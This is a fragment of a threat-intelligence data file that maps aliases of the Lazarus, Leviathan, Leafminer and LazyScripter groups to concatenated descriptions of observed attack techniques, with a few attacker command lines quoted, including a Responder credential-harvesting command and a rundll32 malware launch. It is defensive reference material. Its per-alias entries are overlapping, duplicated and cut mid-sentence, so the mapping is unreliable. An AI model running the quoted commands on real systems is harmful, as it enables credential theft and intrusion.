Operation Dream Job, Lazarus Group deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences., Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available., Lazarus Group has used net use to identify and establish a network connection with a remote host., Various Lazarus Group malware enumerates logged-on users., Lazarus Group has rebooted systems after destroying files and wiping the MBR on infected systems., A Destover-like implant used by Lazarus Group can obtain the current system time and send it to the C2 server., During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file., During Operation Dream Job, Lazarus Group lured users into executing a malicious link to disclose private account information or provide initial access., Lazarus Group has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.During Operation Dream Job, Lazarus Group lured victims into executing malicious documents that contained 'dream job' descriptions from defense, aerospace, and other sectors., During Operation Dream Job, Lazarus Group lured victims into executing malicious documents that contained 'dream job' descriptions from defense, aerospace, and other sectors., Lazarus Group has used administrator credentials to gain access to restricted network segments., During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services., During Operation Dream Job, Lazarus Group used tools that collected GetTickCount and GetSystemTimeAsFileTime data to detect sandbox or VMware services., Lazarus Group has used GitHub as C2, pulling hosted image payloads then committing command execution output to files in specific directories., Lazarus Group has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script., During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script., During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader., Lazarus Group has been observed targeting organizations using spearphishing documents with embedded malicious payloads.  Highly targeted spear phishing campaigns have been conducted against a U.S. electric grid company.",
    "Labyrinth Chollima": "Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context., During Operation Dream Job, Lazarus Group queried compromised victim's active directory servers to obtain the list of employees including administrator accounts., Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account., Lazarus Group has acquired domains related to their campaigns to act as distribution points and C2 channels.During Operation Dream Job, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort., During Operation Dream Job, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort., During Operation Dream Job, Lazarus Group acquired servers to host their malicious tools., Lazarus Group has hosted malicious downloads on Github.During Operation Dream Job, Lazarus Group used file hosting services like DropBox and OneDrive., During Operation Dream Job, Lazarus Group used file hosting services like DropBox and OneDrive., Lazarus Group executed Responder using the command [Responder file path] -i [IP address] -rPv on a compromised host to harvest credentials and move laterally., Lazarus Group has conducted C2 over HTTP and HTTPS.During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers. , During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers. , Lazarus Group malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground., Lazarus Group has compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format, encrypt the .zip file, and upload it to C2. , During Operation Dream Job, Lazarus Group archived victim's data into a RAR file., Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server., A Lazarus Group malware sample encrypts data using a simple byte based XOR operation prior to exfiltration., Lazarus Group has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key.During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence. , During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence. , Lazarus Group malware has maintained persistence on a system by creating a LNK shortcut in the user’s Startup folder., Lazarus Group malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords., Lazarus Group has used PowerShell to execute commands and malicious code.During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims., During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims., Lazarus Group malware uses cmd.exe to execute commands on a compromised host. A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.During Operation Dream Job, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell., During Operation Dream Job, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell., Lazarus Group has used VBA and embedded macros in Word documents to execute malicious code.During Operation Dream Job, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant., During Operation Dream Job, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant., For Operation Dream Job, Lazarus Group compromised domains in Italy and other countries for their C2 infrastructure., Lazarus Group has compromised servers to stage malicious tools.For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools., For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools., Several Lazarus Group malware families install themselves as new services., Lazarus Group has used a custom secure delete function to overwrite file contents with data from heap memory., A Lazarus Group malware sample encodes data with base64., Lazarus Group has collected data and files from compromised networks.During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host.",
    "HIDDEN COBRA": "For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools., Several Lazarus Group malware families install themselves as new services., Lazarus Group has used a custom secure delete function to overwrite file contents with data from heap memory., A Lazarus Group malware sample encodes data with base64., Lazarus Group has collected data and files from compromised networks.During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host., During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host., Lazarus Group malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption., Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server., During Operation Dream Job, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers., Lazarus Group replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a Disk Structure Wipe., Lazarus Group has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime., Lazarus Group has developed custom malware for use in their operations.For Operation Dream Job, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations., For Operation Dream Job, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations., During Operation Dream Job, Lazarus Group digitally signed their malware and the dbxcli utility., Lazarus Group has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory., Lazarus Group malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009., Lazarus Group delivered RATANKBA and other malicious code to victims via a compromised legitimate website., Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Other Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads. Lazarus Group has also used AES to encrypt C2 traffic.During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server., During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server., Lazarus Group has created new Twitter accounts to conduct social engineering against potential victims.For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts., For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts., Lazarus Group has created new email accounts for spearphishing operations.During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt., During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt., Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.",
    "Guardians of Peace": " WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory., Lazarus Group malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009., Lazarus Group delivered RATANKBA and other malicious code to victims via a compromised legitimate website., Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Other Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads. Lazarus Group has also used AES to encrypt C2 traffic.During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server., During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server., Lazarus Group has created new Twitter accounts to conduct social engineering against potential victims.For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts., For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts., Lazarus Group has created new email accounts for spearphishing operations.During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt., During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt., Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims., Lazarus Group has exfiltrated data and files over a C2 channel through its various tools and malware.During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers., During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers., During Operation Dream Job, Lazarus Group used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox., Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution., Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again., Lazarus Group malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters., During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters., Lazarus Group collected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns., Lazarus Group has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets., For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets., During Operation Dream Job, Lazarus Group targeted specific individuals within an organization with tailored job vacancy announcements., Lazarus Group has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application., Lazarus Group has replaced win_fw.dll, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload., Lazarus Group has abused the KernelCallbackTable to hijack process control flow and execute shellcode., Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.. , Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. , During Operation Dream Job, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.",
    "ZINC": "Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. , During Operation Dream Job, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware., Lazarus Group has restored malicious KernelCallbackTable code to its original state after the process execution flow has been hijacked., Lazarus Group has routinely deleted log files on a compromised router, including automatic log deletion through the use of the logrotate utility. , Lazarus Group malware has deleted files in various ways, including 'suicide scripts' to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim.During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer., During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer., Several Lazarus Group malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files., Lazarus Group persistence mechanisms have used forfiles.exe to execute .htm files., Lazarus Group has downloaded files, malware, and tools from its C2 onto a compromised host.During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host., During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host., Lazarus Group malware KiloAlfa contains keylogging functionality., During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization., Lazarus Group has renamed system utilities such as wscript.exe and mshta.exe., Lazarus Group has used a scheduled task named SRCheck to mask the execution of a malicious .dll., Lazarus Group has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files., During Operation Dream Job, Lazarus Group disguised malicious template files as JPEG files to avoid detection., Lazarus Group has used multi-stage malware components that inject later stages into separate processes., Lazarus Group has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server. Lazarus Group has also used various, often lesser known, functions to perform various types of Discovery and Process Injection.During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server., During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server., Lazarus Group has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network., Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches., During Operation Dream Job, Lazarus Group packed malicious .db files with Themida to evade detection., Lazarus Group has used a custom hashing method to resolve APIs used in shellcode., Lazarus Group has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names.During Operation Dream Job, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64., During Operation Dream Job, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64., Lazarus Group has obtained a variety of tools for their operations, including Responder and PuTTy PSCP.For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli., For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli., During Operation Dream Job, Lazarus Group used code signing certificates issued by Sectigo RSA for some of its malware and tools. , Lazarus Group has obtained SSL certificates for their C2 domains., Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.",
    "NICKEL ACADEMY": "During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host., Lazarus Group malware KiloAlfa contains keylogging functionality., During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization., Lazarus Group has renamed system utilities such as wscript.exe and mshta.exe., Lazarus Group has used a scheduled task named SRCheck to mask the execution of a malicious .dll., Lazarus Group has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files., During Operation Dream Job, Lazarus Group disguised malicious template files as JPEG files to avoid detection., Lazarus Group has used multi-stage malware components that inject later stages into separate processes., Lazarus Group has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server. Lazarus Group has also used various, often lesser known, functions to perform various types of Discovery and Process Injection.During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server., During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server., Lazarus Group has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network., Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches., During Operation Dream Job, Lazarus Group packed malicious .db files with Themida to evade detection., Lazarus Group has used a custom hashing method to resolve APIs used in shellcode., Lazarus Group has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names.During Operation Dream Job, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64., During Operation Dream Job, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64., Lazarus Group has obtained a variety of tools for their operations, including Responder and PuTTy PSCP.For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli., For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli., During Operation Dream Job, Lazarus Group used code signing certificates issued by Sectigo RSA for some of its malware and tools. , Lazarus Group has obtained SSL certificates for their C2 domains., Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.During Operation Dream Job, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers., During Operation Dream Job, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers., Lazarus Group has sent malicious links to victims via email.During Operation Dream Job, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email., During Operation Dream Job, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email., Lazarus Group has used social media platforms, including LinkedIn and Twitter, to send spearphishing messages.During Operation Dream Job, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs., During Operation Dream Job, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs., Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down., Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server.",
    "Diamond Sleet": "During Operation Dream Job, Lazarus Group used regsvr32 to execute malware., Lazarus Group has used rundll32 to execute malicious payloads on a compromised host.During Operation Dream Job, Lazarus Group executed malware with C://windows/system32/rundll32.exe 'C:/ProgramData/ThumbNail/thumbnail.db', CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905., During Operation Dream Job, Lazarus Group executed malware with C://windows/system32/rundll32.exe 'C:/ProgramData/ThumbNail/thumbnail.db', CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905., Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server., During Operation Dream Job, Lazarus Group deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences., Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available., Lazarus Group has used net use to identify and establish a network connection with a remote host., Various Lazarus Group malware enumerates logged-on users., Lazarus Group has rebooted systems after destroying files and wiping the MBR on infected systems., A Destover-like implant used by Lazarus Group can obtain the current system time and send it to the C2 server., During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file., During Operation Dream Job, Lazarus Group lured users into executing a malicious link to disclose private account information or provide initial access., Lazarus Group has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.During Operation Dream Job, Lazarus Group lured victims into executing malicious documents that contained 'dream job' descriptions from defense, aerospace, and other sectors., During Operation Dream Job, Lazarus Group lured victims into executing malicious documents that contained 'dream job' descriptions from defense, aerospace, and other sectors., Lazarus Group has used administrator credentials to gain access to restricted network segments., During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services., During Operation Dream Job, Lazarus Group used tools that collected GetTickCount and GetSystemTimeAsFileTime data to detect sandbox or VMware services., Lazarus Group has used GitHub as C2, pulling hosted image payloads then committing command execution output to files in specific directories., Lazarus Group has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script., During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script., During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader., Lazarus Group has been observed targeting organizations using spearphishing documents with embedded malicious payloads.  Highly targeted spear phishing campaigns have been conducted against a U.S. electric grid company.",
    "LazyScripter": "LazyScripter is threat group that has mainly targeted the airlines industry since at least 2018, primarily using open-source toolsets., LazyScripter has used dynamic DNS providers to create legitimate-looking subdomains for C2., LazyScripter has established GitHub accounts to host its toolsets., LazyScripter has leveraged dynamic DNS providers for C2 communications. , LazyScripter has achieved persistence via writing a PowerShell script to the autorun registry key., LazyScripter has used PowerShell scripts to execute malicious code., LazyScripter has used batch files to deploy open-source and multi-stage RATs., LazyScripter has used VBScript to execute malicious code., LazyScripter has used JavaScript in its attacks. , LazyScripter had downloaded additional tools to a compromised host., LazyScripter has used several different security software icons to disguise executables. , LazyScripter has leveraged the BatchEncryption tool to perform advanced batch script obfuscation and encoding techniques., LazyScripter has used a variety of open-source remote access Trojans for its operations., LazyScripter has used spam emails weaponized with archive or document files as its initial infection vector., LazyScripter has used spam emails that contain a link that redirects the victim to download a malicious document., LazyScripter has hosted open-source remote access Trojans used in its operations in GitHub., LazyScripter has used mshta.exe to execute Koadic stagers. , LazyScripter has used rundll32.exe to execute Koadic stagers. , LazyScripter has relied upon users clicking on links to malicious files., LazyScripter has lured users to open malicious email attachments., LazyScripter has used GitHub to host its payloads to operate spam campaigns.",
    "Leafminer": "Leafminer is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. , , Leafminer used a tool called Total SMB BruteForcer to perform internal password spraying., Leafminer infected victims using JavaScript code., Leafminer used a tool called Imecab to set up a persistent remote access account on the victim machine., Leafminer used several tools for retrieving login and password information, including LaZagne., Leafminer used several tools for retrieving login and password information, including LaZagne., Leafminer has infected victims using watering holes., Leafminer used a tool called MailSniper to search through the Exchange server mailboxes for keywords., Leafminer used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files., Leafminer scanned network services to search for vulnerabilities in the victim system., Leafminer obfuscated scripts that were used on victim machines., Leafminer has obtained and used tools such as LaZagne, Mimikatz, PsExec, and MailSniper., Leafminer used several tools for retrieving login and password information, including LaZagne and Mimikatz., Leafminer used several tools for retrieving login and password information, including LaZagne., Leafminer used several tools for retrieving login and password information, including LaZagne., Leafminer has used Process Doppelgänging to evade security software while deploying tools on compromised systems. , Leafminer used Microsoft’s Sysinternals tools to gather detailed information about remote systems., Leafminer used several tools for retrieving login and password information, including LaZagne.",
    "Leviathan": "Leviathan is a Chinese state-sponsored cyber espionage group that has been attributed to the Ministry of State Security's (MSS) Hainan State Security Department and an affiliated front company. Active since at least 2009, Leviathan has targeted the following sectors: academia, aerospace/aviation, biomedical, defense industrial base, government, healthcare, manufacturing, maritime, and transportation across the US, Canada, Europe, the Middle East, and Southeast Asia., , , , , Leviathan was previously reported upon by FireEye as TEMP.Periscope and TEMP.Jumper., FireEye reporting on TEMP.Periscope (which was combined into APT40) indicated TEMP.Periscope was reported upon as Leviathan., Leviathan was previously reported upon by FireEye as TEMP.Periscope and TEMP.Jumper., , Leviathan has established domains that impersonate legitimate entities to use for targeting efforts. , Leviathan has archived victim's data prior to exfiltration., Leviathan has used BITSAdmin to download additional tools., Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor., Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor., Leviathan has used PowerShell for execution., Leviathan has used VBScript., Leviathan has compromised social media accounts to conduct social engineering attacks., Leviathan has compromised email accounts to conduct social engineering attacks., Leviathan has used C:/Windows/Debug and C:/Perflogs as staging directories., Leviathan has staged data remotely prior to exfiltration., Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors., Leviathan has infected victims using watering holes., Leviathan has created new social media accounts for targeting efforts., Leviathan has created new email accounts for targeting efforts., Leviathan has used WMI for persistence., Leviathan has exfiltrated data over its C2 channel., Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox., Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882., Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access., Leviathan has collected compromised credentials to use for targeting efforts., Leviathan has downloaded additional scripts and files from adversary-controlled servers., Leviathan has utilized OLE as a method to insert malicious content inside various phishing documents. , Leviathan has conducted internal spearphishing within the victim's environment for lateral movement., Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection., Leviathan has used steganography to hide stolen data inside other files stored on Github., Leviathan has obfuscated code using base64 and gzip compression., Leviathan has used publicly available tools to dump password hashes, including HOMEFRY., Leviathan has used publicly available tools to dump password hashes, including ProcDump and WCE., Leviathan has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files., Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding., Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim., Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure., Leviathan has used multi-hop proxies to disguise the source of their malicious traffic., Leviathan has targeted RDP credentials and used it to move through the victim environment. , Leviathan used ssh for internal reconnaissance., Leviathan relies on web shells for an initial foothold as well as persistence into the victim's systems., Leviathan has used stolen code signing certificates to sign malware., Leviathan has used regsvr32 for execution., Leviathan has sent spearphishing email links attempting to get a user to click., Leviathan has sent spearphishing attachments attempting to get a user to click., Leviathan has obtained valid accounts to gain initial access., Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet., Leviathan has used WMI for execution.",
    "MUDCARP": "FireEye reporting on TEMP.Periscope (which was combined into APT40) indicated TEMP.Periscope was reported upon as Leviathan., Leviathan was previously reported upon by FireEye as TEMP.Periscope and TEMP.Jumper., , Leviathan has established domains that impersonate legitimate entities to use for targeting efforts. , Leviathan has archived victim's data prior to exfiltration., Leviathan has used BITSAdmin to download additional tools., Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor., Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor., Leviathan has used PowerShell for execution., Leviathan has used VBScript., Leviathan has compromised social media accounts to conduct social engineering attacks., Leviathan has compromised email accounts to conduct social engineering attacks., Leviathan has used C:/Windows/Debug and C:/Perflogs as staging directories., Leviathan has staged data remotely prior to exfiltration., Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors., Leviathan has infected victims using watering holes., Leviathan has created new social media accounts for targeting efforts., Leviathan has created new email accounts for targeting efforts., Leviathan has used WMI for persistence., Leviathan has exfiltrated data over its C2 channel., Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox., Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882., Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access., Leviathan has collected compromised credentials to use for targeting efforts., Leviathan has downloaded additional scripts and files from adversary-controlled servers.",
    "Kryptonite Panda": "Leviathan has infected victims using watering holes., Leviathan has created new social media accounts for targeting efforts., Leviathan has created new email accounts for targeting efforts., Leviathan has used WMI for persistence., Leviathan has exfiltrated data over its C2 channel., Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox., Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882., Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access., Leviathan has collected compromised credentials to use for targeting efforts., Leviathan has downloaded additional scripts and files from adversary-controlled servers., Leviathan has utilized OLE as a method to insert malicious content inside various phishing documents. , Leviathan has conducted internal spearphishing within the victim's environment for lateral movement., Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection., Leviathan has used steganography to hide stolen data inside other files stored on Github., Leviathan has obfuscated code using base64 and gzip compression., Leviathan has used publicly available tools to dump password hashes, including HOMEFRY., Leviathan has used publicly available tools to dump password hashes, including ProcDump and WCE., Leviathan has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files., Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding., Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim., Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure., Leviathan has used multi-hop proxies to disguise the source of their malicious traffic., Leviathan has targeted RDP credentials and used it to move through the victim environment. , Leviathan used ssh for internal reconnaissance., Leviathan relies on web shells for an initial foothold as well as persistence into the victim's systems., Leviathan has used stolen code signing certificates to sign malware., Leviathan has used regsvr32 for execution., Leviathan has sent spearphishing email links attempting to get a user to click., Leviathan has sent spearphishing attachments attempting to get a user to click., Leviathan has obtained valid accounts to gain initial access., Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet., Leviathan has used WMI for execution.",
    "Gadolinium": "Leviathan has obfuscated code using base64 and gzip compression., Leviathan has used publicly available tools to dump password hashes, including HOMEFRY., Leviathan has used publicly available tools to dump password hashes, including ProcDump and WCE., Leviathan has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files., Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding., Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim., Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure., Leviathan has used multi-hop proxies to disguise the source of their malicious traffic., Leviathan has targeted RDP credentials and used it to move through the victim environment. , Leviathan used ssh for internal reconnaissance., Leviathan relies on web shells for an initial foothold as well as persistence into the victim's systems., Leviathan has used stolen code signing certificates to sign malware., Leviathan has used regsvr32 for execution., Leviathan has sent spearphishing email links attempting to get a user to click., Leviathan has sent spearphishing attachments attempting to get a user to click., Leviathan has obtained valid accounts to gain initial access., Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet., Leviathan has used WMI for execution.",
    "Lotus Blossom": "Lotus Blossom is a threat group that has targeted government and military organizations in Southeast Asia.",
